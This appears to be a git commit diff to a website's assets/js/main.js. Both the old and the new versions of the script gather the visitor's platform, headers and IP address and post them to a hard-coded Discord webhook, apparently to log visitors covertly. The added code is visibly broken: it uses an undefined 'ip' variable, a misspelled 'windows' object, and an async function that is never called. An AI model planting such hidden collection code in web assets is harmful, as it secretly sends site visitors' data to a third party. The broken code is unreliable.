3df2cd971168c0c648c7151a3f4bb89dd1764676
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 10:19:39 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,20 +1,12 @@
-
-
 (async () => {
-    await fetch('https://api.ipify.org', { method: 'GET' })
-        .then(async response => {
-            const ip = await response.text().then(async () => {
-                const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\n HEADERS: ${windows.navigator.headers}\nIP: ${ip}` };
-                const webhookResponse = await fetch('https://canary.discord.com/api/webhooks/857029101344129054/IEA809IlFa77UvjVwmH0FIHOV2qmS4UY9Rh0xcVxSHBzObhtdTRb4MvVncjBC2bE-6eC', {
-                    method: 'POST',
-                    headers: {
-                        'Accept': 'application/json',
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(params)
-                });
-
-                const wrespo = await webhookResponse.json();
-            });
-        });
+    const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\n HEADERS: ${windows.navigator.headers}\nIP: ${ip}` };
+    const webhookResponse = await fetch('https://canary.discord.com/api/webhooks/857029101344129054/IEA809IlFa77UvjVwmH0FIHOV2qmS4UY9Rh0xcVxSHBzObhtdTRb4MvVncjBC2bE-6eC', {
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+    });
+    const content = await webhookResponse.json();
 });
